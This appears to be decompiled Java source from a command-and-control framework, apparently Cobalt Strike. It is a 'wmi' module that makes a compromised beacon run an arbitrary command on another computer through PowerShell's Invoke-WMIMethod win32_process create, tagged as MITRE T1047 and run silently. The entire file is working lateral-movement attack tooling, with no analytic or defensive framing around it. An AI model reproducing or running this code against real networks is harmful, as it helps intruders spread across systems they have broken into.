package beacon.methods;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.BeaconRemoteExecMethods;
import beacon.TaskBeacon;

public class WMI implements BeaconRemoteExecMethods.RemoteExecMethod {
   protected AggressorClient client;

   public WMI(AggressorClient var1) {
      this.client = var1;
      DataUtils.getBeaconRemoteExecMethods(var1.getData()).register("wmi", "Remote execute via WMI (PowerShell)", this);
   }

   public void remoteexec(String var1, String var2, String var3) {
      TaskBeacon var4 = new TaskBeacon(this.client, new String[]{var1});
      var4.log_task(var1, "Tasked beacon to run '" + var3 + "' on " + var2 + " via WMI", "T1047");
      var4.silent();
      var4.PowerShellNoImport("Invoke-WMIMethod win32_process -name create -argumentlist '" + var3 + "' -ComputerName " + var2);
   }
}
